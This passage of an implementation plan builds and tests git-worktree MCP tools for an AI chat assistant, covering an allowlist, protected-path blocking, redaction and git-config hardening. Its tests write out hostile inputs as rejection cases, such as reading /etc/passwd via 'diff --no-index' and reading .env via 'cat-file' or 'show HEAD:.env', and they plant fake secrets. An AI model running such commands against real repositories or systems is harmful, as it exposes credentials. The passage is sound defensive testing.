// the sweep. Synchronous DB via getDb()/prepare() — the store.mjs conventions;
// ids are shape-checked before they reach any path (the store.mjs doctrine:
// these paths feed recursive removes).
import { randomBytes } from 'node:crypto';
import { existsSync, mkdirSync, readdirSync, readFileSync, realpathSync } from 'node:fs';
import { realpath } from 'node:fs/promises';
import { join, sep } from 'node:path';
import { getDb, prepare } from '../db.mjs';
import { listProjects } from '../projects.mjs';
import { readStoreMeta, findPipelineRowById } from '../artifacts.mjs';
import { branchExists } from '../git-info.mjs';
import { createDetachedWorktree, removeWorktree, worktreeHead, isValidSourceRef } from '../worktree.mjs';
import { ASK_ID_RE, askRoot } from './store.mjs';
import { ASK_LIMITS } from './limits.mjs';

export const WT_ID_RE = /^wt_[0-9a-f]{8}$/;
// The shared ASK_ID_RE (store.mjs) is the loose /^[a-z]+_[0-9a-f]{8}$/; a thread
// id that becomes a filesystem path is re-checked here against the strict
// ask_-anchored form (matches askWorktreeAllowRules), so a `wt_…`/other-prefix id
// can never reach a path.
const ASK_THREAD_RE = /^ask_[0-9a-f]{8}$/;

export class AskWorktreeError extends Error {
  constructor(message) { super(message); this.name = 'AskWorktreeError'; }
}

const newWtId = () => `wt_${randomBytes(4).toString('hex')}`;
const now = () => new Date().toISOString();
const parse = (v, fallback) => { if (v == null) return fallback; try { return JSON.parse(v); } catch { return fallback; } };

/**
 * `<askRoot>/<threadId>/wt` — refuses a thread id the store never minted, and
 * REALPATHS the dir once it exists. openAskWorktree stores a realpath'd
 * worktree_dir (git emits realpaths; the base is realpath'd), so without this
 * every later `worktreeDirFor`/lookup would MISS on a symlinked home (macOS
 * `/var` -> `/private/var`, any home on a symlinked mount) — Task 5's tools and
 * Task 7's endpoint both resolve worktrees through this helper.
 */
export function worktreesDir(threadId) {
  if (typeof threadId !== 'string' || !ASK_THREAD_RE.test(threadId)) {
    throw new Error('worktreesDir: refusing a thread id the store never minted');
  }
  const dir = join(askRoot(), threadId, 'wt');
  try { return realpathSync(dir); } catch { return dir; }   // realpath'd once it exists
}

/** `<askRoot>/<threadId>/wt/<wtId>` — both ids shape-checked. */
export function worktreeDirFor(threadId, wtId) {
  if (typeof wtId !== 'string' || !WT_ID_RE.test(wtId)) {
    throw new Error('worktreeDirFor: refusing a worktree id the store never minted');
  }
  return join(worktreesDir(threadId), wtId);
}

function rowToWorktree(r) {
  return {
    worktreeId: r.id, threadId: r.thread_id, projectKey: r.project_key,
    projectDir: r.project_dir, ref: r.ref, commit: r.resolved_commit,
    runId: r.run_id ?? null, path: r.worktree_dir,
    createdAt: r.created_at, updatedAt: r.updated_at,
  };
}

export function listAskWorktrees(threadId) {
  getDb();
  return prepare('SELECT * FROM ask_worktrees WHERE thread_id = ? ORDER BY created_at, id')
    .all(threadId).map(rowToWorktree);
}

export function getAskWorktree(threadId, wtId) {
  getDb();
  const r = prepare('SELECT * FROM ask_worktrees WHERE thread_id = ? AND id = ?').get(threadId, wtId);
  return r ? rowToWorktree(r) : null;
}

/** (projectKey, ref) directly, or runId → the record's feature branch;
 *  workspace records need projectKey to pick the member (§5 steps 1-3). */
async function resolveTarget({ projectKey, ref, runId }) {
  if (runId) {
    const row = findPipelineRowById(runId);
    if (!row) throw new AskWorktreeError(`run not found: ${runId}`);
    const isWs = row.target === 'workspace' || !!row.workspace_key;
    if (isWs) {
      const meta = parse(row.workspace_meta, {}) || {};
      const members = Array.isArray(meta.projects) ? meta.projects : [];
      if (!projectKey) {
        throw new AskWorktreeError(`run ${runId} is a workspace run — pass projectKey to pick the member (one of: ${members.map((m) => m.projectKey).join(', ') || 'none'})`);
      }
      const member = members.find((m) => m.projectKey === projectKey);
      const b = (meta.branches || {})[projectKey];
      if (!member || !b || !b.feature) throw new AskWorktreeError(`run ${runId} has no member ${projectKey} with a feature branch`);
      if (!(await branchExists(member.projectDir, b.feature))) {
        throw new AskWorktreeError(`branch ${b.feature} no longer exists — use get_run_diff for the recorded diff`);
      }
      return { projectKey, projectDir: member.projectDir, ref: b.feature, runId };
    }
    const branch = parse(row.branch, {}) || {};
    if (!branch.feature) throw new AskWorktreeError(`run ${runId} has no feature branch`);
    const meta = readStoreMeta(row.project_key);
    const projectDir = meta && meta.path;
    if (!projectDir) throw new AskWorktreeError(`run ${runId}: project directory unknown`);
    if (!(await branchExists(projectDir, branch.feature))) {
      throw new AskWorktreeError(`branch ${branch.feature} no longer exists — use get_run_diff for the recorded diff`);
    }
    return { projectKey: row.project_key, projectDir, ref: branch.feature, runId };
  }
  if (!projectKey || !ref) throw new AskWorktreeError('open_worktree: give (projectKey and ref) or runId');
  const projects = await listProjects();
  const p = projects.find((x) => x.key === projectKey);
  if (!p) throw new AskWorktreeError(`unknown projectKey: ${projectKey} — see list_projects`);
  return { projectKey, projectDir: p.path, ref, runId: null };
}

export async function openAskWorktree({ threadId, projectKey, ref, runId, signal } = {}) {
  getDb();
  if (typeof threadId !== 'string' || !ASK_ID_RE.test(threadId)
      || !prepare('SELECT 1 FROM ask_threads WHERE id = ?').get(threadId)) {
    throw new AskWorktreeError('unknown thread');
  }
  const perThread = prepare('SELECT count(*) AS n FROM ask_worktrees WHERE thread_id = ?').get(threadId).n;
  if (perThread >= ASK_LIMITS.worktreesPerThread) {
    throw new AskWorktreeError(`worktree cap reached (${ASK_LIMITS.worktreesPerThread} per chat) — remove one with remove_worktree, or reuse one from list_worktrees`);
  }
  const globalCount = prepare('SELECT count(*) AS n FROM ask_worktrees').get().n;
  if (globalCount >= ASK_LIMITS.worktreesGlobal) {
    throw new AskWorktreeError(`global worktree cap reached (${ASK_LIMITS.worktreesGlobal}) — remove unused worktrees first`);
  }
  const t = await resolveTarget({
    projectKey: projectKey || undefined, ref: ref || undefined, runId: runId || undefined,
  });
  if (!existsSync(join(t.projectDir, '.git'))) {
    throw new AskWorktreeError(`project ${t.projectKey} has no git repository at ${t.projectDir}`);
  }
  if (!(await isValidSourceRef(t.projectDir, t.ref))) {
    throw new AskWorktreeError(`ref does not resolve: ${JSON.stringify(t.ref)}`);
  }
  const wtId = newWtId();
  mkdirSync(worktreesDir(threadId), { recursive: true });
  // Re-read AFTER mkdir: worktreesDir() realpaths an existing dir, so the stored
  // worktree_dir matches BOTH what `git worktree list` reports AND every later
  // worktreesDir()/worktreeDirFor() lookup. Reading `base` before mkdir would get
  // the un-realpath'd form and every subsequent lookup would miss on a symlinked
  // home (macOS /var -> /private/var). The createWorktree precedent.
  const baseReal = worktreesDir(threadId);
  const dir = join(baseReal, wtId);
  if (!dir.startsWith(baseReal + sep)) throw new AskWorktreeError('worktree path escapes base'); // belt-and-braces
  const { commit } = await createDetachedWorktree({ projectDir: t.projectDir, worktreeDir: dir, ref: t.ref, signal });
  const ts = now();
  prepare(`INSERT INTO ask_worktrees (id, thread_id, project_key, project_dir, ref, resolved_commit, run_id, worktree_dir, created_at, updated_at)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`)
    .run(wtId, threadId, t.projectKey, t.projectDir, t.ref, commit ?? '', t.runId, dir, ts, ts);
  return getAskWorktree(threadId, wtId);
}

export async function removeAskWorktree({ threadId, wtId } = {}) {
  const wt = typeof wtId === 'string' && WT_ID_RE.test(wtId) ? getAskWorktree(threadId, wtId) : null;
  if (!wt) throw new AskWorktreeError('worktree not found');
  const res = await removeWorktree({ projectDir: wt.projectDir, worktreeDir: wt.path, branch: null, force: true });
  prepare('DELETE FROM ask_worktrees WHERE thread_id = ? AND id = ?').run(threadId, wtId);
  return { ok: true, steps: res.steps };
}

/** Thread-delete cascade step (§5): git-proper removal of every row BEFORE the
 *  SQL cascade + the thread-dir rmSync backstop. Never throws — a dead source
 *  repo degrades to removeWorktree's rm-rf + prune best effort. */
export async function removeThreadWorktrees(threadId) {
  if (typeof threadId !== 'string' || !ASK_ID_RE.test(threadId)) return { removed: 0 };
  let removed = 0;
  for (const wt of listAskWorktrees(threadId)) {
    try {
      await removeAskWorktree({ threadId, wtId: wt.worktreeId });
      removed += 1;
    } catch { /* row raced away or repo gone — the rmSync backstop covers the dir */ }
  }
  return { removed };
}

/** After a successful checkout/switch: re-read HEAD and stamp the row so
 *  list_worktrees and the UI always show where the checkout actually points. */
export async function noteWorktreeNavigation(threadId, wtId, { ref } = {}) {
  const wt = getAskWorktree(threadId, wtId);
  if (!wt) return null;
  const head = await worktreeHead(wt.path);
  prepare('UPDATE ask_worktrees SET ref = ?, resolved_commit = ?, updated_at = ? WHERE thread_id = ? AND id = ?')
    .run(ref ?? wt.ref, head ?? wt.commit, now(), threadId, wtId);
  return getAskWorktree(threadId, wtId);
}

/** Recover the source repo of an orphan dir from its `.git` gitdir pointer
 *  (`gitdir: <repo>/.git/worktrees/<name>`), or null. */
function repoDirOfOrphan(dir) {
  try {
    const m = /^gitdir:\s*(.+)$/m.exec(readFileSync(join(dir, '.git'), 'utf8'));
    if (!m) return null;
    const gitdir = m[1].trim();
    const marker = `${sep}.git${sep}worktrees${sep}`;
    const i = gitdir.lastIndexOf(marker);
    return i > 0 ? gitdir.slice(0, i) : null;
  } catch { return null; }
}

/**
 * Boot/doctor sweep (§5): reconcile rows vs dirs BOTH ways. Three-state
 * doctrine — a DB failure aborts the sweep with nothing removed (failed > 0),
 * never "no rows ⇒ reclaim everything".
 * @param {{log?: (level:string, msg:string) => void}} [opts]
 */
export async function sweepAskWorktrees({ log = () => {} } = {}) {
  const summary = { removedDirs: 0, prunedRows: 0, failed: 0 };
  let rows;
  try {
    getDb();
    rows = prepare('SELECT * FROM ask_worktrees').all().map(rowToWorktree);
  } catch (err) {
    summary.failed += 1;
    log('warn', `ask-worktrees: row scan failed — nothing swept (${err.message})`);
    return summary;
  }
  const live = new Set();
  for (const wt of rows) {
    if (existsSync(wt.path)) {
      live.add(await realpath(wt.path).catch(() => wt.path));
      continue;
    }
    try {
      // dir already gone: this is prune + registration cleanup only
      await removeWorktree({ projectDir: wt.projectDir, worktreeDir: wt.path, branch: null, force: true });
      prepare('DELETE FROM ask_worktrees WHERE thread_id = ? AND id = ?').run(wt.threadId, wt.worktreeId);
      summary.prunedRows += 1;
      log('info', `ask-worktrees: dropped stale row ${wt.worktreeId} (dir missing)`);
    } catch (err) {
      summary.failed += 1;
      log('warn', `ask-worktrees: row ${wt.worktreeId} skipped (${err.message})`);
    }
  }
  let root;
  try { root = askRoot(); } catch { return summary; }
  let threads = [];
  try {
    threads = readdirSync(root, { withFileTypes: true })
      .filter((d) => d.isDirectory() && ASK_ID_RE.test(d.name)).map((d) => d.name);
  } catch { return summary; }                                 // no ask root yet — nothing to do
  for (const tid of threads) {
    const base = join(root, tid, 'wt');
    let entries = [];
    try {
      entries = readdirSync(base, { withFileTypes: true })
        .filter((d) => d.isDirectory() && WT_ID_RE.test(d.name)).map((d) => d.name);
    } catch { continue; }                                     // thread has no wt/ dir
    for (const wtId of entries) {
      const dir = join(base, wtId);
      const real = await realpath(dir).catch(() => dir);
      if (live.has(real)) continue;
      const repoDir = repoDirOfOrphan(dir);
      try {
        await removeWorktree({ projectDir: repoDir ?? dir, worktreeDir: dir, branch: null, force: true });
        if (!existsSync(dir)) {
          summary.removedDirs += 1;
          log('info', `ask-worktrees: removed orphan dir ${dir}`);
        } else {
          summary.failed += 1;
          log('warn', `ask-worktrees: orphan ${dir} could not be removed`);
        }
      } catch (err) {
        summary.failed += 1;
        log('warn', `ask-worktrees: orphan ${dir} skipped (${err.message})`);
      }
    }
  }
  return summary;
}
```

- [ ] **Step 4: Run tests**

Run: `node --test test/ask-worktrees.test.mjs 2>&1 | tail -3`
Expected: PASS. Debug signature mismatches against the real helpers, never by weakening assertions.

- [ ] **Step 5: Commit**

```bash
git add src/core/ask/worktrees.mjs test/ask-worktrees.test.mjs
git commit -m "worca: Ask Worca Worktrees — per-thread registry, lifecycle, sweep"
```

---

### Task 5: MCP tools — `open_worktree`, `list_worktrees`, `remove_worktree`, `git`

**Files:**
- Create: `src/core/ask/worktree-deps.mjs`
- Modify: `src/core/ask/tools.mjs` (tool defs + handlers + one additive field in `splitUnifiedDiff`), `src/core/ask/mcp-stdio.mjs` (merge the dep bundles)
- Test: `test/ask-worktree-tools.test.mjs` (create), `test/ask-tools.test.mjs` (the `:58` exact-shape assertion + the `:365` tool-name inventory), `test/ask-mcp-stdio.test.mjs` (the `:139` real-child tool-name inventory)

**Interfaces:**
- Consumes: everything Task 4 exports; `validateGitArgs` (Task 3); `runGitCapture` (Task 2); `GUARDRAIL_PRESETS.secure.protectedPaths`, `redactAskText` (existing).
- Produces:
  - `defaultWorktreeDeps({threadId}) → { worktrees: { open, list, get, remove, noteNav, runGit, validateGitArgs } }` in `worktree-deps.mjs`
  - four tools callable through `createAskTools({...defaultToolDeps(...), ...defaultWorktreeDeps(...)})`; the `git` tool returns `{command, text, truncated, totalBytes, nextOffset}`
  - `splitUnifiedDiff` sections gain `header: boolean` (true when a `diff --git` line opened the section)

- [ ] **Step 1: Write the failing tests**

```js
// test/ask-worktree-tools.test.mjs
// P4/T5: the worktree MCP tools over fake deps + one temp-home round trip over
// the real bundle; the deps-split source scan; the diff/show redaction floor.
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { spawnSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { useTempHome } from './helpers/temp-home.mjs';
import { addProject } from '../src/core/projects.mjs';
import { createThread } from '../src/core/ask/store.mjs';
import { createAskTools, AskToolError, splitUnifiedDiff } from '../src/core/ask/tools.mjs';
import { defaultToolDeps } from '../src/core/ask/tool-deps.mjs';
import { defaultWorktreeDeps } from '../src/core/ask/worktree-deps.mjs';

useTempHome(after);

const created = [];
after(() => Promise.all(created.map((d) => rm(d, { recursive: true, force: true }))));
async function freshRepo() {
  const dir = await mkdtemp(join(tmpdir(), 'worca-cc-wtt-'));
  created.push(dir);
  const g = (args) => spawnSync('git', args, { cwd: dir });
  g(['init', '-q', '-b', 'main']);
  g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  await writeFile(join(dir, 'README.md'), '# hi\n');
  await writeFile(join(dir, '.env'), 'API_KEY=supersecret\n');
  g(['add', '-A']); g(['commit', '-qm', 'init']);
  return dir;
}

function realTools(threadId) {
  return createAskTools({ ...defaultToolDeps({ threadId }), ...defaultWorktreeDeps({ threadId }) });
}

test('tools/list exposes the four new tools with schemas', async () => {
  const tools = realTools('ask_00000001');
  const names = tools.list().map((t) => t.name);
  for (const n of ['open_worktree', 'list_worktrees', 'remove_worktree', 'git']) assert.ok(names.includes(n), n);
  const git = tools.list().find((t) => t.name === 'git');
  assert.deepEqual(git.inputSchema.required, ['worktreeId', 'args']);
  assert.equal(git.inputSchema.properties.args.type, 'array');
});

test('round trip: open → list → git log/diff/checkout → remove; row ref follows navigation', async () => {
  const repo = await freshRepo();
  const g = (args) => spawnSync('git', args, { cwd: repo });
  g(['checkout', '-qb', 'feature']);
  await writeFile(join(repo, 'feat.txt'), 'F\n');
  g(['add', '-A']); g(['commit', '-qm', 'feat']);
  g(['checkout', '-q', 'main']);
  const p = (await addProject({ name: 'wtt-one', path: repo })).find((x) => x.name === 'wtt-one');
  const t = createThread();
  const tools = realTools(t.id);
  const wt = await tools.call('open_worktree', { projectKey: p.key, ref: 'main' });
  assert.match(wt.worktreeId, /^wt_[0-9a-f]{8}$/);
  assert.match(wt.commit, /^[0-9a-f]{40}$/);
  const listed = await tools.call('list_worktrees', {});
  assert.deepEqual(listed.worktrees.map((w) => w.worktreeId), [wt.worktreeId]);
  const log = await tools.call('git', { worktreeId: wt.worktreeId, args: ['log', '--oneline'] });
  assert.match(log.text, /init/);
  assert.equal(log.command, 'git log --oneline');
  const diff = await tools.call('git', { worktreeId: wt.worktreeId, args: ['diff', 'main...feature'] });
  assert.match(diff.text, /feat\.txt/);
  await tools.call('git', { worktreeId: wt.worktreeId, args: ['checkout', 'feature'] });
  const after1 = await tools.call('list_worktrees', {});
  assert.equal(after1.worktrees[0].ref, 'feature', 'row follows navigation');
  assert.notEqual(after1.worktrees[0].commit, wt.commit);
  await tools.call('remove_worktree', { worktreeId: wt.worktreeId });
  assert.deepEqual((await tools.call('list_worktrees', {})).worktrees, []);
});

test('git tool: allowlist rejection, unknown worktree, unknown remote are AskToolErrors', async () => {
  const repo = await freshRepo();
  const p = (await addProject({ name: 'wtt-two', path: repo })).find((x) => x.name === 'wtt-two');
  const t = createThread();
  const tools = realTools(t.id);
  const wt = await tools.call('open_worktree', { projectKey: p.key, ref: 'main' });
  await assert.rejects(() => tools.call('git', { worktreeId: wt.worktreeId, args: ['push'] }), AskToolError);
  await assert.rejects(() => tools.call('git', { worktreeId: wt.worktreeId, args: ['pull'] }), /fetch/);
  await assert.rejects(() => tools.call('git', { worktreeId: 'wt_ffffffff', args: ['log'] }), /open_worktree first/);
  await assert.rejects(() => tools.call('git', { worktreeId: wt.worktreeId, args: ['fetch', 'nonexistent-remote'] }), /unknown remote/);
  await assert.rejects(() => tools.call('git', { worktreeId: wt.worktreeId, args: ['log', '-c', 'x=y'] }), /not allowed/);
  await assert.rejects(() => tools.call('git', { worktreeId: wt.worktreeId, args: ['cat-file', '-p', 'HEAD'] }), /allowlist/);
});

test('git diff/show/log: protected sections dropped, redaction fires on KEPT sections, escapes closed', async () => {
  // GHP is a GitHub PAT shape redactAskText masks — adjust to its exact pattern
  // (chat/redact.mjs). CRITICAL: it lives in ok.md (a NON-protected, KEPT section)
  // so redaction is actually exercised — a secret in .env alone is dropped whole
  // and would pass even with deps.redact deleted (the v1 test was vacuous here).
  const GHP = `ghp_${'A'.repeat(36)}`;
  const repo = await freshRepo();
  const g = (args) => spawnSync('git', args, { cwd: repo });
  g(['checkout', '-qb', 'leak']);
  await writeFile(join(repo, '.env'), 'DB_PASSWORD=hunter2-plaintext\n');           // protected → dropped whole
  await writeFile(join(repo, 'ok.md'), `token: ${GHP}\n`);                          // KEPT → must be redacted
  g(['add', '-A']); g(['commit', '-qm', 'leak the env']);
  g(['checkout', '-q', 'main']);
  const p = (await addProject({ name: 'wtt-three', path: repo })).find((x) => x.name === 'wtt-three');
  const t = createThread();
  const tools = realTools(t.id);
  const wt = await tools.call('open_worktree', { projectKey: p.key, ref: 'main' });

  const diff = await tools.call('git', { worktreeId: wt.worktreeId, args: ['diff', 'main...leak'] });
  assert.ok(diff.text.includes('ok.md'), 'harmless section kept');
  assert.ok(!diff.text.includes('.env'), 'protected section dropped whole');
  assert.ok(!diff.text.includes('hunter2-plaintext'), 'protected file body never appears');
  assert.ok(!diff.text.includes(GHP), 'redaction fired on the KEPT section (non-vacuous)');

  // `show` keeps a commit-message preamble (header-less WITH a header present),
  // but drops the protected .env patch:
  const show = await tools.call('git', { worktreeId: wt.worktreeId, args: ['show', 'leak'] });
  assert.match(show.text, /leak the env/, 'commit message survives');
  assert.ok(!show.text.includes('hunter2-plaintext'));

  // log -p now runs through the SAME filter (it did not in v1):
  const logp = await tools.call('git', { worktreeId: wt.worktreeId, args: ['log', '-p'] });
  assert.ok(!logp.text.includes('hunter2-plaintext'), 'log -p is filtered too');
  assert.ok(!logp.text.includes(GHP), 'log -p redaction fires');

  // Escapes that must be REFUSED, not filtered:
  await assert.rejects(() => tools.call('git', { worktreeId: wt.worktreeId, args: ['diff', '--color=always', 'main...leak'] }), /not allowed/);
  await assert.rejects(() => tools.call('git', { worktreeId: wt.worktreeId, args: ['cat-file', '-p', 'HEAD:.env'] }), AskToolError);
  await assert.rejects(() => tools.call('git', { worktreeId: wt.worktreeId, args: ['show', 'HEAD:.env'] }), /protected path/);
  await assert.rejects(() => tools.call('git', { worktreeId: wt.worktreeId, args: ['diff', '--no-index', '/etc/hosts', '/etc/passwd'] }), /not allowed/);

  // grep with no match is exit 1 = DATA, not a tool failure:
  const nohit = await tools.call('git', { worktreeId: wt.worktreeId, args: ['grep', '-n', 'DEFINITELY-NOT-PRESENT'] });
  assert.equal(nohit.text, '', 'no-match grep is empty, not an error');

  const paged = await tools.call('git', { worktreeId: wt.worktreeId, args: ['log', '--oneline'], maxBytes: 8 });
  assert.equal(paged.truncated, paged.totalBytes > 8);
});

test('source scans: tools.mjs still write-free; worktree-deps.mjs holds only the worktree bundle', () => {
  const tools = readFileSync(new URL('../src/core/ask/tools.mjs', import.meta.url), 'utf8');
  assert.doesNotMatch(tools, /from '\.\.\/db\.mjs'|getDb\(|\btx\(|node:sqlite/);
  const deps = readFileSync(new URL('../src/core/ask/worktree-deps.mjs', import.meta.url), 'utf8');
  assert.doesNotMatch(deps, /from '\.\.\/db\.mjs'|node:sqlite|writeStoreMeta|writeFile|appendFile|rmSync/);
  for (const m of ['./worktrees.mjs', '../worktree.mjs', './git-allowlist.mjs']) {
    assert.ok(deps.includes(`from '${m}'`), `worktree-deps imports ${m}`);
  }
  const stdio = readFileSync(new URL('../src/core/ask/mcp-stdio.mjs', import.meta.url), 'utf8');
  // Match the WIRING, not the import line — `/defaultWorktreeDeps/` alone passes
  // even if the createAskTools spread is deleted (M5.13 survived that mutation).
  assert.match(stdio, /createAskTools\(\{[\s\S]*?defaultWorktreeDeps/, 'the MCP child spreads the worktree bundle into createAskTools');
});

test('splitUnifiedDiff: sections carry header:true/false, incl. member headers', () => {
  const s = splitUnifiedDiff('message text\ndiff --git a/x.md b/x.md\n+++ b/x.md\n+x\n');
  assert.deepEqual(s.map((x) => [x.path, x.header]), [[null, false], ['x.md', true]]);
  // member-header sections carry header:false too (they have no diff --git line) —
  // pins M5.5/M5.6, which nothing else in the suite covers:
  const ws = splitUnifiedDiff('# alpha-00000001\ndiff --git a/y.md b/y.md\n+++ b/y.md\n+y\n');
  assert.deepEqual(ws.map((x) => [x.path, x.member, x.header]), [[null, true, false], ['y.md', false, true]]);
});
```

- [ ] **Step 2: Run to verify failure**

Run: `node --test test/ask-worktree-tools.test.mjs 2>&1 | tail -3`
Expected: FAIL — cannot find module `worktree-deps.mjs`.

- [ ] **Step 3: Implement**

1. `src/core/ask/worktree-deps.mjs`:

```js
// src/core/ask/worktree-deps.mjs
// The WRITE-CAPABLE dep bundle of the worktree tools (ask-worca-worktrees-
// design.md §8). Deliberately separate from tool-deps.mjs, whose source is
// scanned as read-only: everything that creates/removes checkouts or updates
// ask_worktrees rows is reachable ONLY through here, and
// test/ask-worktree-tools.test.mjs pins this module's import surface.
import {
  openAskWorktree, listAskWorktrees, getAskWorktree, removeAskWorktree,
  noteWorktreeNavigation,
} from './worktrees.mjs';
import { runGitCapture } from '../worktree.mjs';
import { validateGitArgs } from './git-allowlist.mjs';

/** @param {{threadId:string}} opts  every operation is scoped to this thread */
export function defaultWorktreeDeps({ threadId }) {
  return {
    worktrees: {
      open: (input) => openAskWorktree({ ...input, threadId }),
      list: () => listAskWorktrees(threadId),
      get: (wtId) => getAskWorktree(threadId, wtId),
      remove: (wtId) => removeAskWorktree({ threadId, wtId }),
      noteNav: (wtId, patch) => noteWorktreeNavigation(threadId, wtId, patch),
      runGit: (cwd, args, opts) => runGitCapture(cwd, args, opts),   // opts passthrough (timeout) for callers; the tool dispatcher passes none today
      validateGitArgs,
    },
  };
}
```

2. `src/core/ask/tools.mjs` — three edits:

   a. In `splitUnifiedDiff`, add the section flag: in `start(...)` nothing changes; in `flush()` extend the pushed object with `header: cur.hasHeader,` (place it after `member: false,`). Also add `header: false,` to the member-header section literal (the `sections.push({ path: null, …, member: true, …})` at the `MEMBER_HEADER_RE` branch — members carry no diff header). Update the module doc comment: "`header` is true when a `diff --git ` line opened the section."

   b. Add the four defs to `defs` (after `read_attachment`; `L` is in scope):

```js
    { name: 'open_worktree',
      description: 'Create a read-only DETACHED git worktree of a registered project at any branch/tag/commit (projectKey + ref), or of a run\'s feature branch (runId; workspace runs also need projectKey). Returns {worktreeId, path, ref, commit}. Capped per chat — reuse via list_worktrees, remove via remove_worktree when done.',
      inputSchema: SCHEMA.obj({ projectKey: SCHEMA.s('project key from list_projects'),
        ref: SCHEMA.s('branch, tag or commit to check out'),
        runId: SCHEMA.s('run id — checks out that run\'s feature branch') }) },
    { name: 'list_worktrees',
      description: 'List this chat\'s worktrees: worktreeId, project, current ref and commit, path on disk.',
      inputSchema: SCHEMA.obj({}) },
    { name: 'remove_worktree',
      description: 'Remove one of this chat\'s worktrees by id. Branches are never touched.',
      inputSchema: SCHEMA.obj({ worktreeId: SCHEMA.s('worktree id') }, ['worktreeId']) },
    { name: 'git',
      description: 'Run a read-only git command inside one of this chat\'s worktrees; args is an argv array, e.g. ["diff","origin/master...HEAD"]. Allowed: diff, log, show, status, blame, branch/tag (list forms), rev-parse, merge-base, grep, shortlog, describe, ls-files, ls-tree, checkout/switch (always detached), fetch (configured remotes only). To read a file\'s contents, check out the ref and use Read — the git tool serves diffs/logs/history. push/pull/commit/config/cat-file are impossible. Output paged by offset like get_run_diff.',
      inputSchema: SCHEMA.obj({ worktreeId: SCHEMA.s('worktree id'),
        args: { type: 'array', items: { type: 'string' }, description: 'git argv, without the leading "git"' },
        offset: SCHEMA.i('byte offset to page from', 0, Number.MAX_SAFE_INTEGER),
        maxBytes: SCHEMA.i('bytes per page (default 60000, max 200000)', 1, L.gitOutputMaxBytes) }, ['worktreeId', 'args']) },
```

   c. Add the handlers (inside `handlers`, after `read_attachment`), plus one shared helper block (`asToolError`, `PATCH_CAPABLE`, `LIST_SUBS`, `GIT_HARDEN`, `protectedInArgs`) right above `const handlers`:

```js
  // Worktree failures are model-actionable → AskToolError text, never a crash.
  const asToolError = (err) => (err && err.name === 'AskWorktreeError' ? new AskToolError(err.message) : err);

  // Output shapes differ by subcommand, so the filter is chosen by what git ACTUALLY
  // emitted, not by the subcommand name — running a path-list (grep/ls-*) or a
  // commit-list (log --oneline) through the unified-diff section filter would drop
  // ALL of it. Two sets:
  //   PATCH_CAPABLE — accept --no-ext-diff/--no-color and can emit a `diff --git`
  //     patch (diff, show <commit>, log -p). Output is section-filtered ONLY when a
  //     real diff header is present.
  //   LIST_SUBS — emit PATH LISTS (grep, ls-files, ls-tree). Output is line-filtered.
  // blame is neither: a protected FILE is rejected at input (protectedInArgs); a
  // non-protected file's annotated content is fine (Read-able in the worktree anyway).
  // cat-file is absent from the allowlist entirely.
  const PATCH_CAPABLE = new Set(['diff', 'show', 'log']);
  const LIST_SUBS = new Set(['grep', 'ls-files', 'ls-tree']);
  // Trusted -c prepended by US (never the model — validateGitArgs already blocks the
  // model's -c): neutralises a hostile repo's `.git/config` (or ~/.gitconfig, whose
  // HOME survives the scrub) `diff.external`/pager, and forces predictable path/colour
  // output the section parser depends on. --no-ext-diff/--no-color are the belt-braces.
  const GIT_HARDEN = ['-c', 'core.quotePath=false', '-c', 'diff.external=', '-c', 'color.ui=never', '-c', 'diff.submodule=short'];
  // Reject a command that NAMES a protected file BEFORE spawning: every non-flag
  // positional — a bare token (blame .env), the <path> half of <rev>:<path>
  // (show HEAD:.env), and anything after `--` (log -p -- .env). A ref like
  // `main...leak` has a non-protected basename, so it passes.
  const protectedInArgs = (args) => {
    let afterSep = false;
    for (const a of args.slice(1)) {
      if (a === '--') { afterSep = true; continue; }
      if (a.startsWith('-')) continue;
      const cand = (!afterSep && a.includes(':')) ? a.slice(a.indexOf(':') + 1) : a;
      if (cand && isProtectedBasename(cand, deps.protectedPaths)) return cand;
    }
    return null;
  };
```

```js
    async open_worktree(input) {
      try {
        const wt = await deps.worktrees.open({
          projectKey: str(input.projectKey) || undefined,
          ref: str(input.ref) || undefined,
          runId: str(input.runId) || undefined,
        });
        return { worktreeId: wt.worktreeId, path: wt.path, projectKey: wt.projectKey, ref: wt.ref, commit: wt.commit };
      } catch (err) { throw asToolError(err); }
    },
    async list_worktrees() {
      return { worktrees: deps.worktrees.list().map((w) => ({
        worktreeId: w.worktreeId, projectKey: w.projectKey, ref: w.ref, commit: w.commit,
        path: w.path, createdAt: w.createdAt })) };
    },
    async remove_worktree(input) {
      const id = str(input.worktreeId);
      if (!id) throw new AskToolError('remove_worktree: worktreeId is required');
      try { await deps.worktrees.remove(id); return { ok: true }; } catch (err) { throw asToolError(err); }
    },
    async git(input) {
      const id = str(input.worktreeId);
      const wt = id ? deps.worktrees.get(id) : null;
      if (!wt) throw new AskToolError('git: worktree not found — open_worktree first');
      const v = deps.worktrees.validateGitArgs(input.args);
      if (!v.ok) throw new AskToolError(`git: ${v.error}`);
      const bad = protectedInArgs(v.args);
      if (bad) throw new AskToolError(`git: ${JSON.stringify(bad)} is a protected path — check out the ref and Read the file instead`);
      if (v.fetch) {
        const remotes = await deps.worktrees.runGit(wt.path, ['remote']);
        const names = remotes.ok ? remotes.stdout.split(/\r?\n/).map((s) => s.trim()).filter(Boolean) : [];
        const target = v.args.slice(1).find((a) => !a.startsWith('-'));
        if (target && !names.includes(target)) throw new AskToolError(`git: unknown remote ${JSON.stringify(target)} (configured: ${names.join(', ') || 'none'})`);
        if (!target && !v.args.includes('--all') && !names.length) throw new AskToolError('git: no remotes configured in this repository');
      }
      // Prepend the trusted hardening -c; add --no-ext-diff/--no-color ONLY to the
      // patch-capable subs (ls-files/ls-tree/grep reject --no-ext-diff).
      const argv = [...GIT_HARDEN, ...v.args, ...(PATCH_CAPABLE.has(v.args[0]) ? ['--no-ext-diff', '--no-color'] : [])];
      const r = await deps.worktrees.runGit(wt.path, argv);
      // Row follows checkout/switch AND fetch (§5): fetch re-reads HEAD + stamps updated_at.
      if (r.ok && (v.nav || v.fetch)) {
        const positional = v.nav ? (v.args.filter((a) => !a.startsWith('-'))[1] ?? wt.ref) : wt.ref;
        await deps.worktrees.noteNav(id, { ref: positional });
      }
      // `grep` (no match) and `diff --exit-code` use exit 1 as DATA, not an error.
